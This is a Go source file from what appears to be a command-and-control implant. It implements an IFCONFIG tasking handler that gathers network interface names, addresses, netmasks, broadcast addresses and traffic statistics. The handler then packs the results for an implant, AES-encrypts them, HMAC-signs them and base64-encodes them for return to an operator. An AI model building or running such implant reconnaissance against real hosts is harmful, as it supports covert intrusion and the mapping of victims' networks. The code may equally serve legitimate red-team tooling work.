package core

import (
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"strings"
)

// HandleIFCONFIG handles the IFCONFIG command - displays network interface information
func HandleIFCONFIG(ctx *CommandContext, tid [8]byte) string {
	println("\n-> IFCONFIG")

	// Get all network interfaces
	interfaces, err := net.Interfaces()
	if err != nil {
		responseTaskPayload := fmt.Sprintf("Error getting network interfaces: %s", err.Error())
		taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
		println(taskRestEnc)
		return taskRestEnc
	}

	var output strings.Builder
	output.WriteString("Network Interfaces:\n")
	output.WriteString("==================\n\n")

	for _, iface := range interfaces {
		// Interface name and flags
		output.WriteString(fmt.Sprintf("%s: flags=%d<%s>\n", iface.Name, iface.Flags, iface.Flags.String()))

		// MAC address
		if len(iface.HardwareAddr) > 0 {
			output.WriteString(fmt.Sprintf("    HWaddr: %s\n", iface.HardwareAddr.String()))
		}

		// MTU
		output.WriteString(fmt.Sprintf("    MTU: %d\n", iface.MTU))

		// Get addresses
		addrs, err := iface.Addrs()
		if err != nil {
			output.WriteString(fmt.Sprintf("    Error getting addresses: %s\n", err.Error()))
		} else {
			for _, addr := range addrs {
				// Parse the address
				var ip net.IP
				var mask net.IPMask

				switch v := addr.(type) {
				case *net.IPNet:
					ip = v.IP
					mask = v.Mask
				case *net.IPAddr:
					ip = v.IP
				}

				if ip == nil {
					continue
				}

				// Determine address type
				addrType := "inet"
				if ip.To4() == nil {
					addrType = "inet6"
				}

				// Format output
				if mask != nil {
					// Calculate network and broadcast (for IPv4)
					if ip.To4() != nil {
						ipnet := &net.IPNet{IP: ip, Mask: mask}
						network := ipnet.IP.Mask(mask)

						// Calculate broadcast
						broadcast := make(net.IP, len(network))
						copy(broadcast, network)
						for i := range broadcast {
							broadcast[i] |= ^mask[i]
						}

						maskSize, _ := mask.Size()
						output.WriteString(fmt.Sprintf("    %s: %s  netmask: %s  broadcast: %s  (/%d)\n",
							addrType, ip.String(), net.IP(mask).String(), broadcast.String(), maskSize))
					} else {
						// IPv6
						maskSize, _ := mask.Size()
						output.WriteString(fmt.Sprintf("    %s: %s  prefixlen: %d\n",
							addrType, ip.String(), maskSize))
					}
				} else {
					output.WriteString(fmt.Sprintf("    %s: %s\n", addrType, ip.String()))
				}
			}
		}

		// Interface statistics (Linux-specific)
		if stat, ok := getInterfaceStats(iface.Name); ok {
			output.WriteString(fmt.Sprintf("    RX packets:%d  bytes:%d\n", stat.RxPackets, stat.RxBytes))
			output.WriteString(fmt.Sprintf("    TX packets:%d  bytes:%d\n", stat.TxPackets, stat.TxBytes))
		}

		output.WriteString("\n")
	}

	taskResp := PackResponse(ctx.Implant, []byte(output.String()), tid)
	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
	println(taskRestEnc)
	return taskRestEnc
}

// InterfaceStats holds basic network interface statistics
type InterfaceStats struct {
	RxPackets uint64
	RxBytes   uint64
	TxPackets uint64
	TxBytes   uint64
}

// getInterfaceStats reads interface statistics from /sys/class/net (Linux-specific)
func getInterfaceStats(ifname string) (InterfaceStats, bool) {
	var stats InterfaceStats
	basePath := fmt.Sprintf("/sys/class/net/%s/statistics/", ifname)

	// Try to read statistics files
	if data, err := os.ReadFile(basePath + "rx_packets"); err == nil {
		fmt.Sscanf(string(data), "%d", &stats.RxPackets)
	} else {
		return stats, false
	}

	if data, err := os.ReadFile(basePath + "rx_bytes"); err == nil {
		fmt.Sscanf(string(data), "%d", &stats.RxBytes)
	}

	if data, err := os.ReadFile(basePath + "tx_packets"); err == nil {
		fmt.Sscanf(string(data), "%d", &stats.TxPackets)
	}

	if data, err := os.ReadFile(basePath + "tx_bytes"); err == nil {
		fmt.Sscanf(string(data), "%d", &stats.TxBytes)
	}

	return stats, true
}
